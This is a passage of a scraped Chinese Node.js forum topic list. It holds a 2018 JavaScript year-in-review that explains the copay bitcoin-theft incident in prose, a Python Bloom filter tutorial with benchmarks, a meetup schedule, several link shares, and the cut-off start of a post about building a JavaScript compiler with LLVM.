href=\"https://github.com/bitpay/copay\">copay</a>项目中正确执行，窃取用户的密码、私钥等信息，从而盗取比特币；</li>\n<li>有人说什么Vue可能遭受攻击，其实没有这回事，因为黑客代码只会在<a href=\"https://github.com/bitpay/copay\">copay</a>项目中正确执行。只有<a href=\"https://github.com/bitpay/copay\">copay</a>项目的<a href=\"https://github.com/bitpay/copay/blob/cd3f2b380588e6bc90e6c498bf9ae075bcc59e34/package.json\">package.json</a>中的<a href=\"https://github.com/bitpay/copay/blob/cd3f2b380588e6bc90e6c498bf9ae075bcc59e34/package.json#L3\">description</a>字符串&quot;A Secure Bitcoin Wallet&quot;能够解密黑客代码；而且，黑客的代码是为<a href=\"https://github.com/bitpay/copay\">copay</a>量身定做的，对其他项目没有作用；再说，黑客是来窃取的比特币的，又不是挖矿，你的项目有比特币给人家偷吗?</li>\n</ul>\n<p>同学们，不要被标题党给骗了啊！</p>\n<h3>《Refactoring》第2版改用JavaScript</h3>\n<p><a href=\"https://book.douban.com/subject/1229923/\">《重构：改善既有代码的设计》</a>大多数人都没看过，但是至少应该都听过。这本书刚出了<a href=\"https://www.amazon.com/gp/product/0134757599\">第二版</a>，所有示例代码由Java改成了JavaScript。</p>\n<p>根据作者<a href=\"https://martinfowler.com/articles/refactoring-2nd-ed.html\">Martin Fowler</a>的<a href=\"https://martinfowler.com/articles/refactoring-2nd-ed.html\">解释</a>，**《重构》这本书重点在于思想，适用于各种编程语言，所以选择什么语言并不重要。**而他选择JavaScript的原因很简单，因为JS既支持面向过程编程，又支持面向对象编程，这样方便写非OOP代码重构的示例。</p>\n<p>这里不妨引用<a href=\"https://www.zhihu.com/question/46397274/answer/101193678\">尤雨溪</a>的一句话：</p>\n<blockquote>\n<p>至于重构、设计什么的，我只想说，看的是使用的人的水平，跟用什么语言没那么大关系。水平烂的人用 TS 一样写的是翔一样的代码，看看 java 就知道了。</p>\n</blockquote>\n<p>《Refactoring》的示例代码用什么语言写根本不重要，重要的是背后的编程思想。顺便推荐一下《Clean Code》。</p>\n<p><img src=\"https://image.fundebug.com/2018-12-24-refactoring.jpg\" alt></p>\n<p>这本书原价54.66刀，的确有点贵，不过算是必读书，大家看着办…</p>\n<h3>GitHub抛弃jQuery</h3>\n<p>一直以来，GitHub最流行的编程语言都是JavaScript，可以说GitHub是全球最大的JS开发者社交平台了；同时，因为被IE的兼容问题折磨了多年，前端痛恨Microsoft！但是，有钱任性的Microsoft以75亿美元收购了GitHub！</p>\n<p>另外，<a href=\"https://githubengineering.com/removing-jquery-from-github-frontend/\">GitHub的技术极客们花了数年时间，以非常规范的流程完全移除GitHub网站了jQuery</a>：</p>\n<ul>\n<li>实现了一个ESlint插件<a href=\"https://github.com/dgraham/eslint-plugin-jquery\">eslint-plugin-jquery</a>，禁止在代码中使用已经弃用的jQuery方法。这样可以防止同事使用jQuery方法。</li>\n<li>使用原生代码重写了2个依赖于jQuery的模块<a href=\"https://github.com/defunkt/jquery-pjax\">jquery-pjax</a>和<a href=\"https://github.com/defunkt/facebox\">facebox</a>。</li>\n<li>开发一个定制的jQuery版本，一旦完全移除某个jQuery方法，就删除jQuery中的对应代码。这样既可以减少jQuery大小，也可以防止同事使用已经移除的jQuery方法。</li>\n<li>根据用户统计数据，来逐步放弃支持低版本的IE浏览器，这样的话可以无需依赖jQuery来保证兼容性。</li>\n<li>…</li>\n</ul>\n<p>是否使用jQuery各有各的想法和需求，但是<strong>GitHub弃用jQuery的流程非常专业，可以作为处理技术债的标准规范</strong>。</p>\n<h3>Microsoft爱上JavaScript</h3>\n<p>土豪Microsoft似乎爱上了JavaScript，它家的<a href=\"https://www.reddit.com/r/programming/comments/8qqhlz/comment/e0ll1dt/\">Office 365, MicroSoft Teams以及Skype都开始使用JavaScript重写了</a>。原因无疑是JS的跨平台特性。同一套代码多处运行，虽然现在还有很多问题，但是这样的未来不是挺好么？</p>\n<p>此处应该再来感受一下大名鼎鼎的<a href=\"https://blog.codinghorror.com/the-principle-of-least-power/\">Atwood’s Law</a>：</p>\n<blockquote>\n<p>Any application that can be written in JavaScript, will eventually be written in JavaScript</p>\n</blockquote>\n<p>在浏览器市场上，Microsoft曾经通过捆绑Windows打败了网景，不过这些年在Chrome面前一败涂地，现在终于&quot;认输&quot;，选择<a href=\"https://www.ifanr.com/1138933\">基于Chromium重写浏览器</a>。对于JSer来说，至少意味着浏览器兼容问题可以缓解很多。</p>\n<p>根据<a href=\"https://2018.stateofjs.com/other-tools/\">The State of JavaScript 2018</a>，Microsoft开发的<a href=\"https://code.visualstudio.com/\">Visual Studio code</a>俨然已经成为最受JSer欢迎的代码编辑器，一些流行插件下载量高达上千万：</p>\n<p><img src=\"https://image.fundebug.com/2018-12-24-vscode.png\" alt></p>\n<p>市值超过Apple，重回全球市值最高公司的Microsoft有钱任性，买下了JS开发者最多的GitHub。</p>\n<p>IT界的罗马帝国(出处：吴军《浪潮之巅》)Microsoft又重新崛起了，这是一件很了不起的事情。</p>\n<h3>Oracle宣示JavaScript主权</h3>\n<p><a href=\"https://mp.weixin.qq.com/s/gRtOaTXdLYVrIPnejVytMw\">Oracle明年就要开始给Java收费</a>，虽然只是JDK 8的u192之后的更新要收费，这个行为大概会让很多Java开发者不爽…</p>\n<p>另外，<a href=\"https://mp.weixin.qq.com/s/Q5bK8qHgLRzTsrA3NdC9wQ?\">Oracle还要求一个iOS开发者将一款叫做”HTML5, CSS, JavaScript, HTML, Snippet Editor“的App从App Store下架</a>，因为App名字中包含“JavaScript”字眼，而Oracle拥有JavaScript在美国的商标权。</p>\n<p>Oracle这位大爷惹不起，因此大家正在一本正经地<a href=\"https://www.techrepublic.com/article/why-its-finally-time-to-give-up-on-the-name-javascript/\">建议给JavaScript改名</a>。当然这基本上是不可能的，这辈子都不可能。。。</p>\n<h3>参考</h3>\n<ul>\n<li><a href=\"https://blog.fundebug.com/2018/12/03/how-does-javascript-hacker-steal-bitcoin/\">JavaScript黑客是这样窃取比特币的，Vue开发者不用担心！</a></li>\n<li><a href=\"https://blog.fundebug.com/2018/11/28/10-english-technolody-newsletter/\">强烈推荐10个值得订阅的国外技术周报</a></li>\n<li><a href=\"https://blog.fundebug.com/2018/08/10/ecmascript-2018/\">ECMAScript 2018特性确定了</a></li>\n</ul>\n<h3>关于Fundebug</h3>\n<p><a href=\"https://www.fundebug.com/\">Fundebug</a>专注于JavaScript、微信小程序、微信小游戏、支付宝小程序、React Native、Node.js和Java实时BUG监控。 自从2016年双十一正式上线，Fundebug累计处理了9亿+错误事件，得到了Google、360、金山软件、百姓网等众多知名用户的认可。欢迎免费试用！</p>\n<p><img src=\"https://static.fundebug.cn/wechat_slogan.png\" alt></p>\n<h3>版权声明</h3>\n<p>转载时请注明作者<a href=\"https://www.fundebug.com/\">Fundebug</a>以及本文地址：\n<a href=\"https://blog.fundebug.com/2018/12/25/what-happens-in-2018-for-javascript/\">https://blog.fundebug.com/2018/12/25/what-happens-in-2018-for-javascript/</a></p>\n</div>","title":"2018年，JavaScript都经历了什么？","last_reply_at":"2019-02-21T03:27:48.960Z","good":true,"top":false,"reply_count":13,"visit_count":3795,"create_at":"2018-12-25T02:06:57.767Z","author":{"loginname":"Fundebug","avatar_url":"https://avatars2.githubusercontent.com/u/26496557?v=4&s=120"}},{"id":"5c6e13a033b0b629ac843988","author_id":"5c6e123833b0b629ac84396b","tab":"share","content":"<div class=\"markdown-text\"><p>官方文档 <a href=\"https://linkorg.club/#/view/button\">https://linkorg.club/#/view/button</a></p>\n</div>","title":"vue2.x UI 组件，包含校验输入框，tip文字提示框，按钮，switch开关，ip子网掩码输入框，更新。。。","last_reply_at":"2019-02-21T02:57:36.728Z","good":false,"top":false,"reply_count":0,"visit_count":720,"create_at":"2019-02-21T02:57:36.728Z","author":{"loginname":"Linkontoask","avatar_url":"https://avatars1.githubusercontent.com/u/26475695?v=4&s=120"}},{"id":"5c6ab1b6ed5543510be8cbe0","author_id":"5a9d2f0989a57ad544fa4279","tab":"share","content":"<div class=\"markdown-text\"><p><a href=\"https://github.com/zhangxiang958/zhangxiang958.github.io/issues/43\">https://github.com/zhangxiang958/zhangxiang958.github.io/issues/43</a> 事件循环总览\n<a href=\"https://github.com/zhangxiang958/zhangxiang958.github.io/issues/44\">https://github.com/zhangxiang958/zhangxiang958.github.io/issues/44</a> setTimeout, setImmediate, nextTick\n<a href=\"https://github.com/zhangxiang958/zhangxiang958.github.io/issues/45\">https://github.com/zhangxiang958/zhangxiang958.github.io/issues/45</a> promises,nexttick 与 immediate\n<a href=\"https://github.com/zhangxiang958/zhangxiang958.github.io/issues/46\">https://github.com/zhangxiang958/zhangxiang958.github.io/issues/46</a> IO 处理\n<a href=\"https://github.com/zhangxiang958/zhangxiang958.github.io/issues/47\">https://github.com/zhangxiang958/zhangxiang958.github.io/issues/47</a> 最佳实践</p>\n</div>","title":"翻译了一个关于事件循环的系列博文，请大家多多指教","last_reply_at":"2019-02-21T02:27:21.175Z","good":false,"top":false,"reply_count":3,"visit_count":880,"create_at":"2019-02-18T13:23:02.531Z","author":{"loginname":"zhangxiang958","avatar_url":"https://avatars1.githubusercontent.com/u/13307374?v=4&s=120"}},{"id":"5c57980805cc322e7b1373ab","author_id":"5ac77987e34737560fccaa7b","tab":"share","content":"<div class=\"markdown-text\"><ul>\n<li><a href=\"http://canvas.bengbuzhangyue.xyz/love/dist/\">爱心闪烁效果</a></li>\n<li><a href=\"http://canvas.bengbuzhangyue.xyz/ballline/dist/\">简单的离子效果</a></li>\n<li><a href=\"http://canvas.bengbuzhangyue.xyz/simple_fireworks/dist/\">简单的烟花效果</a></li>\n<li><a href=\"http://canvas.bengbuzhangyue.xyz/simple_image_edit/dist/\">canvas实现图片裁切</a></li>\n<li><a href=\"http://canvas.bengbuzhangyue.xyz/BiuBiuBiu/dist/\">canvas射激光</a></li>\n<li><a href=\"http://canvas.bengbuzhangyue.xyz/paopao/dist/\">canvas实现鼠标跟踪动画</a></li>\n<li><a href=\"http://canvas.bengbuzhangyue.xyz/3d/dist/\">canvas实现3D文字</a></li>\n</ul>\n</div>","title":"最近学习canvas，做了一些效果的合集","last_reply_at":"2019-02-21T02:08:18.145Z","good":false,"top":false,"reply_count":14,"visit_count":2312,"create_at":"2019-02-04T01:40:24.214Z","author":{"loginname":"BengBu-YueZhang","avatar_url":"https://avatars3.githubusercontent.com/u/24958677?v=4&s=120"}},{"id":"5c6ddfb5e1a81129a7ad8f1a","author_id":"550973933135610a365b01fa","tab":"share","content":"<div class=\"markdown-text\"><h4>闲暇之余，将antd-pro项目的状态管理全部迁移到cc，欢迎大家尝鲜体验cc带来的全新体验，<a href=\"https://github.com/fantasticsoul/rcc-antd-pro\">项目地址</a></h4>\n<h4>快速预览</h4>\n<ul>\n<li><code>git clone https://github.com/fantasticsoul/rcc-antd-pro</code></li>\n<li><code>cd rcc-antd-pro</code></li>\n<li><code>npm i</code></li>\n<li><code>npm start</code></li>\n</ul>\n<h4><a href=\"https://juejin.im/post/5c39d15f6fb9a049e0639068\">react-control-center是什么</a></h4>\n</div>","title":"ant-design-pro powered by react-control-center","last_reply_at":"2019-02-21T02:05:59.487Z","good":false,"top":false,"reply_count":0,"visit_count":566,"create_at":"2019-02-20T23:16:05.442Z","author":{"loginname":"fantasticsoul","avatar_url":"https://avatars0.githubusercontent.com/u/7334950?v=4&s=120"}},{"id":"5c6bce08b8913c5110b0c6b4","author_id":"5ac77987e34737560fccaa7b","tab":"share","content":"<div class=\"markdown-text\"><p><img src=\"https://i.loli.net/2019/02/19/5c6bcdd0355f4.png\" alt=\"image\"></p>\n<p><a href=\"https://github.com/BengBu-YueZhang/javascript-algorithms\">https://github.com/BengBu-YueZhang/javascript-algorithms</a></p>\n<p>写的比较low</p>\n</div>","title":"javascript用来解决的leetcode~~~~","last_reply_at":"2019-02-20T05:57:26.317Z","good":false,"top":false,"reply_count":6,"visit_count":735,"create_at":"2019-02-19T09:36:08.232Z","author":{"loginname":"BengBu-YueZhang","avatar_url":"https://avatars3.githubusercontent.com/u/24958677?v=4&s=120"}},{"id":"5c6cc852e1a81129a7ad88dc","author_id":"576a5d4063075514079b77e7","tab":"share","content":"<div class=\"markdown-text\"><p>小程序项目工程化，助力小程序开发。</p>\n<p><a href=\"https://www.liayal.com/article/5c6b76a6c0ab13505eeefaaf\">https://www.liayal.com/article/5c6b76a6c0ab13505eeefaaf</a></p>\n</div>","title":"手把手教你在小程序项目中配置Gulp","last_reply_at":"2019-02-20T03:24:02.361Z","good":false,"top":false,"reply_count":0,"visit_count":674,"create_at":"2019-02-20T03:24:02.361Z","author":{"loginname":"MaelWeb","avatar_url":"https://avatars1.githubusercontent.com/u/7869311?v=4&s=120"}},{"id":"5c6baf04b8913c5110b0c4c1","author_id":"511350f6df9e9fcc58856443","tab":"share","content":"<div class=\"markdown-text\"><h2>前言</h2>\n<p>今天是中国传统佳节“猿宵节”，是程序猿通宵赶代码的佳节。<br>\nAI考拉的技术小伙伴志在打破传统，以“我们不加班”为口号，以“我们提早下班”为指导中心，在这里安利技术知识给大家，祝大家节日快乐，提前下班，过真正的元宵节！</p>\n<h2>需求</h2>\n<p>在金融业务系统里面，判断用户是否是黑名单，这种场景应该很常见。</p>\n<p>假设我们系统里面有一百万个黑名单用户，用手机号表示，现在有一个人想借款，我们要判断他是否在黑名单中，怎么做？</p>\n<h2>一般方法</h2>\n<p>最直接的方法，是在数据库中查询，目前数据库上实现的索引，虽然可以做到\nO(logn)\n或者理论O(1)\n的时间复杂度，但毕竟是磁盘操作，跟内存操作不是一个数量级的。</p>\n<p>于是，我们可以把黑名单中的手机号缓存到内存中，用一个数组储存起来，这种方法有两个问题，一是查找时间复杂度是\nO(n)，非常慢，二是占用大量内存。</p>\n<p>查找速度上可以再优化，将数组变成Set，内部实现可以选择平衡二叉树或者哈希，这样子插入和查找的时间复杂度能做到\nO(logn)或者理论O(1)，但是带来的是空间上的灾难，比使用数组会更占用空间。</p>\n<p>现在来看一下代码，对比一下这两种方法:</p>\n<pre class=\"prettyprint\"><code>import random\nimport sys\n\ndef generate_random_phone():\n    &quot;&quot;&quot;\n    随机生成11位的字符串\n    &quot;&quot;&quot;\n    phone = &#x27;&#x27;\n    for j in range(0, 11):\n        phone += str(random.randint(0, 9))\n    return phone\n\n# 10万个黑名单用户\nblack_list = []\nfor i in range(0, 100000):\n    black_list.append(generate_random_phone())\n\n# 转成集合\nblack_set = set(black_list)\nprint(len(black_list), len(black_set))\n# 看一下两种数据结构的空间占用\nprint(&quot;size of black_list: %f M&quot; % (sys.getsizeof(black_list) &#x2F; 1024 &#x2F; 1024))\nprint(&quot;size of black_set: %f M&quot; % (sys.getsizeof(black_set) &#x2F; 1024 &#x2F; 1024))\n\ndef brute_force_find():\n    &quot;&quot;&quot;\n    直接列表线性查找，随机查一个存在或者不存在的元素, O(n)\n    &quot;&quot;&quot;\n    if random.randint(0, 10) % 2:\n        target = black_list[random.randint(0, len(black_list))]\n        return __brute_force_find(target)\n    else:\n        return __brute_force_find(generate_random_phone())\n\ndef __brute_force_find(target):\n    for i in range(0, len(black_list)):\n        if target == black_list[i]:\n            return True\n    return False\n\ndef set_find():\n    &quot;&quot;&quot;\n    集合查找，随机查一个存在或者不存在的元素, O(1)\n    &quot;&quot;&quot;\n    if random.randint(0, 10) % 2:\n        target = black_list[random.randint(0, len(black_list))]\n        return __set_find(target)\n    else:\n        return __set_find(generate_random_phone())\n\ndef __set_find(target):\n    return target in black_set\n\nprint(brute_force_find())\nprint(set_find())  \n</code></pre><p>可以看到，数组和集合的长度相等，说明元素都是唯一的。列表的空间占用为0.78M，而集合的空间占用为4M，主要是因为哈希表的数据结构需要较多指针连接冲突的元素，空间占用大概是列表的5倍。这是10w个手机号，如果有1亿个手机号，将需要占用3.9G的空间。</p>\n<p>下面来看一下性能测试:</p>\n<pre class=\"prettyprint language-\"><code>import timeit\n\nprint(timeit.repeat(&#x27;brute_force_find()&#x27;, number=100, setup=&quot;from __main__ import brute_force_find&quot;))\nprint(timeit.repeat(&#x27;set_find()&#x27;, number=100, setup=&quot;from __main__ import set_find&quot;))  \n</code></pre><pre class=\"prettyprint language- [0.8502976149320602, 0.8765472685918212, 0.9624506058171391]\"><code>[0.0016423738561570644, 0.0013590981252491474, 0.0014535998925566673]   \n</code></pre><p>可以看到，直接线性查询大概需要0.85s, 而集合的查询仅需要0.0016s，速度上是质的提升，但是空间占用太多了！</p>\n<h4>有没有一种数据结构，既可以做到集体查找的时间复杂度，又可以省空间呢？</h4>\n<p><strong>答案是布隆过滤器</strong>，只是它有误判的可能性，当一个手机号经过布隆过滤器的查找，返回属于黑名单时，有一定概率，这个手机号实际上并不属于黑名单。 回到我们的业务中来，如果一个借款人有0.001%的概率被我们认为是黑名单而不借钱给他，其实是可以接受的，用风控的一句话说: 宁可错杀一百，也不放过一个。说明，利用布隆过滤器来解决这个问题是合适的。</p>\n<h2>布隆过滤器原理</h2>\n<p>原理非常简单，维护一个非常大的位图，设长度为m，选取k个哈希函数。</p>\n<p>初始时，这个位图，所有元素都置为0。 对于黑名单中的每一个手机号，用k个哈希函数计算出来k个索引值，把位图中这k个位置都置为1。 当查询某个元素时，用k个哈希函数计算出来k个索引值，如果位图中k个位置的值都为1，说明这个元素可能存在，如果有一个位置不为1，则一定不存在。</p>\n<p>这里的查询，说的可能存在，是因为哈希函数可能会出现冲突，一个不存在的元素，通过k个哈希函数计算出来索引，可能跟另外一个存在的元素相同，这个时间就出现了误判。所以，要降低误判率，明显是通过增大位图的长度和哈希函数的个数来实现的。<br>\n<img src=\"//static.cnodejs.org/FmJsOHhCzgL3zhbkIIE3hpmzT0tl\" alt=\"687474703a2f2f696d61676573323031352e636e626c6f67732e636f6d2f626c6f672f313033303737362f3230313730312f313033303737362d32303137303130363134333134313738342d313437353033313030332e706e67.png\"></p>\n<p>来看一下代码:</p>\n<pre class=\"prettyprint\"><code>from bitarray import bitarray\nimport mmh3\n\nclass BloomFilter:\n    def __init__(self, arr):\n        # 位图长度暂定为20倍黑名单库的大小\n        self.SIZE = 20 * len(arr)\n        self.bit_array = bitarray(self.SIZE)\n        self.bit_array.setall(0)\n        for item in arr:\n            for pos in self.get_positions(item):\n                self.bit_array[pos] = 1\n        \n    def get_positions(self, val):\n        # 使用10个哈希函数，murmurhash算法，返回索引值\n        return [mmh3.hash(val, i) % self.SIZE for i in range(40, 50)]\n            \n    def find(self, val):\n        for pos in self.get_positions(val):\n            if self.bit_array[pos] == 0:\n                return False\n        return True\n    \nbloomFilter = BloomFilter(black_list)\nprint(&quot;size of bloomFilter&#x27;s bit_array: %f M&quot; % (sys.getsizeof(bloomFilter.bit_array) &#x2F; 1024 &#x2F; 1024))\n\ndef get_error_rate():\n    # 用1w个随机手机号，测试布隆过滤器的错误率\n    size = 10000\n    error_count = 0\n    for i in range(0, size):\n        phone = generate_random_phone()\n        bloom_filter_result = bloomFilter.find(phone)\n        set_result = __set_find(phone)\n        if bloom_filter_result != set_result:\n            error_count += 1\n    return error_count &#x2F; size\n\nprint(get_error_rate())  \n</code></pre><pre class=\"prettyprint language-\"><code>size of bloomFilter&#x27;s bit_array: 0.000092 M\n0.0001  \n</code></pre><p>可以看到，虽然位图的长度是原数据的20倍，但是占用的空间却很小，这是因为位图的8个元素才占用1个字节，而原数据列表中1个元素就占用了将近11个字节。</p>\n<p>错误率大约为0.0001，可以尝试不同的位图长度，比如改成30倍，错误率就会降低到0。</p>\n<p>最后来看一下3种算法的性能测试:</p>\n<pre class=\"prettyprint language-\"><code>def bloom_filter_find():\n    if random.randint(0, 10) % 2:\n        target = black_list[random.randint(0, len(black_list))]\n        return bloomFilter.find(target)\n    else:\n        return bloomFilter.find(generate_random_phone())\n\nprint(timeit.repeat(&#x27;brute_force_find()&#x27;, number=100, setup=&quot;from __main__ import brute_force_find&quot;))\nprint(timeit.repeat(&#x27;set_find()&#x27;, number=100, setup=&quot;from __main__ import set_find&quot;))\nprint(timeit.repeat(&#x27;bloom_filter_find()&#x27;, number=100, setup=&quot;from __main__ import bloom_filter_find&quot;)) \n</code></pre><pre class=\"prettyprint language-\"><code>[0.70748823415488, 0.7686979519203305, 0.7785645266994834]\n[0.001686999574303627, 0.002007704693824053, 0.0013333242386579514]\n[0.001962156966328621, 0.0018132571130990982, 0.0023592300713062286]      \n</code></pre><p>可以看到，布隆过滤器的查找速度接近集合的查找速度，有时候甚至更快，在很低的误判率可以接受的情况下，选用布隆过滤器是即省时间又省空间的，是最佳的选择。</p>\n<h2>参考链接</h2>\n<ol>\n<li><a href=\"https://github.com/cpselvis/zhihu-crawler/wiki/%E5%B8%83%E9%9A%86%E8%BF%87%E6%BB%A4%E5%99%A8%E7%9A%84%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E7%8E%B0\">布隆过滤器的原理和实现</a></li>\n</ol>\n<hr>\n<p>著作权归本文作者所有，未经授权，请勿转载，谢谢。</p>\n</div>","title":"AI考拉技术分享--布隆过滤器实战","last_reply_at":"2019-02-20T03:14:09.570Z","good":false,"top":false,"reply_count":4,"visit_count":617,"create_at":"2019-02-19T07:23:48.099Z","author":{"loginname":"kalengo","avatar_url":"https://avatars2.githubusercontent.com/u/8817810?v=4&s=120"}},{"id":"5c1760337ec239239ff579a2","author_id":"54009f5ccd66f2eb37190485","tab":"share","content":"<div class=\"markdown-text\"><p>北京1月12日Node Party活动视频地址：<a href=\"https://edu.talkingdata.com/open-class\">https://edu.talkingdata.com/open-class</a></p>\n<p>Node Party 是社区发起的一个面向 Node.js 和大前端爱好者的非商业，社区驱动的技术分享聚会，希望能够构建一个持续的分享学习平台，一起发展大前端生态。</p>\n<p>北京1月12日Node Party线下活动（周六）下午2点到6点，将近100人</p>\n<ul>\n<li>主题分享（已确认，共5个主题：3个Node.js主题，一个运维，一个前端）\n<ul>\n<li>《重新认识Nodejs后端开发》 eggjs + React + SSR 做同构直出（去哪儿）</li>\n<li>《用mqtt协议实现nodejs长连接服务》Nodejs长连接，主要是性能和协议改造方面的（新浪）</li>\n<li>《浅谈nodejs异步那点事》（360）</li>\n<li>结合Node.js讲一下Docker 实践和原理（网易）</li>\n<li>iview作者：如何做好一个开源项目（TalkingData）</li>\n</ul>\n</li>\n<li>视情况可以考虑晚上AA聚</li>\n</ul>\n<p>时间：北京1月12日（周六）下午2点到6点\n地点：东直门TalkingData赞助的502教室\n人数：最多100人\n直播地址：<a href=\"https://live.bilibili.com/1353202\">https://live.bilibili.com/1353202</a></p>\n<p>现场还有 <a href=\"/user/justjavac\">@justjavac</a>，@小爵，@快手天翔 @王龑 等大咖。</p>\n<p>图灵出版社赞助了20本书，现场送给大家</p>\n<h2>日程安排</h2>\n<p>每个主题分享+答疑共45分钟，5个主题分享：3个Node.js主题，一个运维，一个前端\n茶歇5分钟（北京乐至道科技有限公司赞助茶歇，已经京东到会场）\n圆桌会议30分钟</p>\n<p>2:00-2:45\n刘露颖：《用mqtt协议实现nodejs长连接服务》Nodejs长连接，主要是性能和协议改造方面的（新浪）</p>\n<p>2:45-3:30\n张晋涛：《结合Node.js讲一下Docker 实践和原理》（网易）</p>\n<p>3:30-4:15\niView作者Aresn：如何做好一个开源项目（TalkingData）</p>\n<p>茶歇5分钟，感谢北京乐至道科技有限公司。DaDEX.io基于EOS公链开发，链上合约自动执行，全部交易上链，率先实现去中心化交易、高并发、低手续费、资金安全、最高交易透明的真去中心化交易所范式，无需注册、认证等繁琐流程，个人钱包内一键交易。致力于完善EOS生态，服务EOS用户，与跨链技术的结合，向传统中心化交易所发起挑战</p>\n<p>4:20-4:50\n圆桌会议：畅想一下前端2019（大神待定）</p>\n<p>4:50-5:35\n兴百放：《重新认识Nodejs后端开发》 eggjs + React + SSR 做同构直出（去哪儿）</p>\n<p>5:35-6:10\n宋光宇：《浅谈nodejs异步那点事》（360）</p>\n<h2>主题</h2>\n<h3>1）《重新认识Node.js后端开发》</h3>\n<p>兴百放，先就职在美团外卖事业部，负责前后端分离，以及 Nodejs 推广工作。本着不管黑猫白猫，只要能解决现实业务问题，提高团队工作效率，就是好猫的原则，致力于让团队成员从重复，耗时，繁琐的一些工作中解放出来。</p>\n<p>随着前端行业的蓬勃发展，越来越多的技术团队，对前端的职责范围，也慢慢的延伸到后端。这里就分享一些在我们进行服务自治（BFF），以及接管传统后端职责一些沉淀和经验。内容主要包括如何做技术框架的选型，使用 egg 一些经验总结，和 eggjs + React + SSR 做同构直出等内容 。</p>\n<p><img src=\"//static.cnodejs.org/FnS8WR95lO1Ff7KevyeHsDHuNCjp\" alt=\"兴百放.png\"></p>\n<h3>2）《Docker 实践和原理》</h3>\n<p>张晋涛，目前任网易有道资深运维开发工程师, 负责 DevOPS 实践落地及 Kubernetes 容器化平台及自动化平台的规划建设等。骨灰级 Linux/Vim 玩家，对 Docker， Kubernetes 及相关生态有大量实践及深入源码的研究。曾负责美图运维自动化平台体系建设。掘金小册《Kubernetes 从上手到实践》作者。</p>\n<p>随着 Kubernetes 等云原生技术的事实标准已经形成，容器化技术作为其重要的组成部分也被使用的越来越广泛。在我们的开发实践中，如何更好的利用容器化技术( Docker )来提升我们的开发，测试效率也是我们所关注的重点。 本次分享集中于如何用 Docker 提升我们的效率以及如何用好它。以 node 和 前端为入手点，希望能对大家有所帮助。</p>\n<p><img src=\"//static.cnodejs.org/FoVKIjHzQJqhwe6IgBWiw2BEWoX-\" alt=\"张晋涛.png\"></p>\n<h3>3）《浅谈Node.js异步那点事》</h3>\n<p>宋光宇 360前端工程师 360视频云/360云盘@奇舞团，</p>\n<p>nodejs给前端赋予了更多的生命力，它的异步模型给他带来无限的潜力。\n今天通过libuv这个nodejs核心库来聊聊nodejs异步的那点事。</p>\n<p><img src=\"//static.cnodejs.org/FmlpCMQIdEjJBXaxDSLS77gpcdqw\" alt=\"宋光宇.png\"></p>\n<h3>4）iView作者：如何做好一个开源项目</h3>\n<p>Aresn，基于 Vue.js 的开源 UI 组件库 — iView 的作者。现担任大数据公司 TalkingData 前端架构师。著有《Vue.js实战》、《Vue.js组件精讲》。\nTopic：</p>\n<ul>\n<li>iView 的故事</li>\n<li>第一批用户</li>\n<li>持续运营</li>\n<li>国际化</li>\n<li>让更多的人参与</li>\n<li>让 Robot 来做“坏人”</li>\n<li>赞助与商业化</li>\n</ul>\n<p><img src=\"//static.cnodejs.org/FlPAOO-2v0z85GbQ5StQPcIo5ESN\" alt=\"梁灏.png\"></p>\n<h3>5）《用mqtt协议实现Node.js长连接服务》</h3>\n<p>刘露颖，曾就职搜狐视频，新浪博客，目前任职新浪移动团队资深前端开发工程师，负责nodejs相关的服务开发与维护、以及部分运维相关工作。致力于v8的研究，对c++与nodejs之间的关系有深厚兴趣，并付诸实践。</p>\n<p>mqtt协议随着各种手机app的普及，在移动互联网中有了广泛的应用，借着项目的实践过程，讲术如何更好的使mqtt与nodejs相结合，为现在越来越普遍的高并发场景提供长连接服务的解决方案。</p>\n<p><img src=\"//static.cnodejs.org/FtVeXBznM2mqBtcxdDQEiC13R_xj\" alt=\"刘露颖.png\"></p>\n<h2>微信群</h2>\n<p>群满100人后无法加群的, 添加我微信 mcdongWang 备注 node party 北京 我回拉你进群</p>\n<p><img src=\"//static.cnodejs.org/FvqZCML0PfbFHt6xknAhJmkWKDPU\" alt=\"31545188678_.pic.jpg\"></p>\n<p>公众号文章地址</p>\n<p><a href=\"https://mp.weixin.qq.com/s?__biz=MzAxMTU0NTc4Nw==&amp;mid=2661157727&amp;idx=1&amp;sn=0b7a6aa495fbe3afe4a4d3774faf8706&amp;chksm=80d5d68bb7a25f9d125e17ff08d1f373435db4a8a7fe2d074f4fbe58c517beb93266e08a4295&amp;token=1373872492&amp;lang=zh_CN#rd\">https://mp.weixin.qq.com/s?__biz=MzAxMTU0NTc4Nw==&amp;mid=2661157727&amp;idx=1&amp;sn=0b7a6aa495fbe3afe4a4d3774faf8706&amp;chksm=80d5d68bb7a25f9d125e17ff08d1f373435db4a8a7fe2d074f4fbe58c517beb93266e08a4295&amp;token=1373872492&amp;lang=zh_CN#rd</a></p>\n</div>","title":"【\b活动+视频】北京1月12日Node Party活动","last_reply_at":"2019-02-20T01:29:08.170Z","good":false,"top":false,"reply_count":51,"visit_count":7769,"create_at":"2018-12-17T08:37:07.278Z","author":{"loginname":"i5ting","avatar_url":"https://avatars3.githubusercontent.com/u/3118295?v=4&s=120"}},{"id":"5b923a504cdb88f72f5a916a","author_id":"5875bd3d06fa6e2a4e4f730b","tab":"share","content":"<div class=\"markdown-text\"><p>上一篇文章 <a href=\"https://github.com/zy445566/myBlog/tree/master/20180825llvm/20180825jsvm_c\">利用LLVM实现JS的编译器，创造属于自己的语言</a> 中讲到使用llvm用C实现JS编译器，本片文章将使用JS来实现JS编译器，还是应了《Atwood定律》能够使用JavaScript实现的，必将使用JavaScript实现。本片文章C代码不超过10行，即使完全不会C也可以相对容易的阅读。</p>\n<blockquote>\n<p>本文代码仓库地址:<a href=\"https://github.com/zy445566/myBlog/tree/master/20180825llvm/20180908jsvm_js\">点这里</a></p>\n</blockquote>\n<h1>本次使用npm库</h1>\n<h2><a href=\"/user/babel\">@babel</a>/core</h2>\n<p>直接使用<a href=\"/user/babel\">@babel</a>/core来进行词法分析和生成ast。</p>\n<h2>llvm-node</h2>\n<p>使用本库将ast树绑定生成IR(中间代码)和编译成二进制文件，虽然这个库看起来没什么文档，但好用api基本写在了llvm-node.d.ts里面。题外话：讲真我挺喜欢用ts写的库，但我个人不喜欢写ts，当然这并不矛盾。</p>\n<h1>使用<a href=\"/user/babel\">@babel</a>/core进行解析</h1>\n<p>讲真这个挺好用的，解析JS就几行代码就能生成ast,爽歪歪，具体结构不展开，自己可以尝试一下。代码也就几行，应该一看就明白了。</p>\n<pre class=\"prettyprint 